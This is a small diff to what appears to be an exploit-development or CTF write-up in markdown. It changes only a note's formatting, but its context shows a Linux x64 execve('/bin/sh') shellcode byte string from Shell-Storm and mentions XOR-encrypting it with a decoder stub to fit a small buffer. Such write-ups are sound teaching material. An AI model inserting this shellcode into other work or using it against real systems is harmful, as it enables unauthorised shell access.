@@ -96,7 +96,9 @@ We can do that by XOR encrypting the shellcode and adding a small stub that gets
 
 For the shellcode I grabbed a Linux x64 execve(/bin/sh) shellcode from [Shell-Storm](https://shell-storm.org/shellcode/index.html)
 
-> Made sure to get a small one because our buffer is limited to around 60 bytes.
+{{< note >}}
+Made sure to get a small one because our buffer is limited to around 60 bytes.
+{{< /note >}}
 
 ```python
 shellcode = b"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"
